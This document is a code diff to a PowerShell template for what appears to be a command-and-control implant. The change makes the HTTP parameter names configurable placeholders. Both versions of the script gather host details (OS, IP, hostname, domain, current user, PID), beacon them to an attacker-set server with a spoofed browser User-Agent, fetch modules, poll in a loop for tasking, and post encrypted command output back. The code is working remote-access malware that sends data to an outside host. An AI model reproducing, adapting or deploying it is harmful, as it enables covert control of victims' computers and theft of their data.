@@ -61,12 +61,12 @@ function load(${module})
             ${wc3}.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
 
             try{
-              ${postParams} = @{data=${modulename}}
-                ${req}=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri {HTTP}://{ip}:{port}{md}?page=${agent} -Method POST -Body ${postParams}
+              ${postParams} = @{{AGENTVAR}=${agent};{DATAVAR}=${modulename}}
+                ${req}=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri {HTTP}://{ip}:{port}{md} -Method POST -Body ${postParams}
 		${req}=${req}.Content
             }
             catch{
-                ${postParams} = "data=${modulename}&resource=${agent}&b=0"
+                ${postParams} = "{AGENTVAR}=${agent}&{DATAVAR}=${modulename}"
                 ${wc3} = new-object net.WebClient
                 ${wc3}.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
                 ${wc3}.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
@@ -91,7 +91,7 @@ ${IP}=(gwmi -query "Select IPAddress From Win32_NetworkAdapterConfiguration Wher
 ${random} = -join ((65..90) | Get-Random -Count 5 | % {[char]$_});
 ${agent}="${random}-img.jpeg"
 
-${finaldata}="data=${os}**${IP}**${arch}**${hostname}**${domain}**${whoami}**$pid&${random}=${agent}"
+${finaldata}="{DATAVAR}=${os}**${IP}**${arch}**${hostname}**${domain}**${whoami}**$pid&${random}=${agent}"
 ${wc3} = new-object net.WebClient
       ${wc3}.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
       ${wc3}.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
@@ -99,7 +99,6 @@ ${wc3} = new-object net.WebClient
 ${progressPreference} = 'silentlyContinue';
 
 ${wc3} = New-Object system.Net.WebClient;
-
 $windows=${agent}
 while($true){
 ${seed}=[int](Get-Date -UFormat "%s")%97
@@ -108,12 +107,12 @@ ${data}=-join ((65..90)*500 + (97..122)*500 | Get-Random -Count ${rand} | % {[ch
 
 
 try{
-    ${postParams} = @{resource=${agent};authentication=${data}}
+    ${postParams} = @{{AGENTVAR}=${agent};token=${data}}
 ${enc}=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri {HTTP}://{ip}:{port}{cmd} -Method POST -Body ${postParams}
 ${enc}=${enc}.Content
 }
  catch{
-${postParams}="resource=${agent}&authentication=${data}"
+${postParams}="{AGENTVAR}=${agent}&token=${data}"
         ${wc3} = new-object net.WebClient
       ${wc3}.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
       ${wc3}.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
@@ -187,11 +186,11 @@ ${redata}=enc -key $key -{un} ${output}
 
 
  try{
-      ${postParams} = @{resource=${agent};data=${redata}}
+      ${postParams} = @{{AGENTVAR}=${agent};{DATAVAR}=${redata}}
 ${result}=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri {HTTP}://{ip}:{port}{re} -Method POST -Body ${postParams}
 }
  catch{
- ${postParams} = "resource=${agent}&data=${redata}"
+ ${postParams} = "{AGENTVAR}=${agent}&{DATAVAR}=${redata}"
         ${wc3} = new-object net.WebClient
       ${wc3}.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
       ${wc3}.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
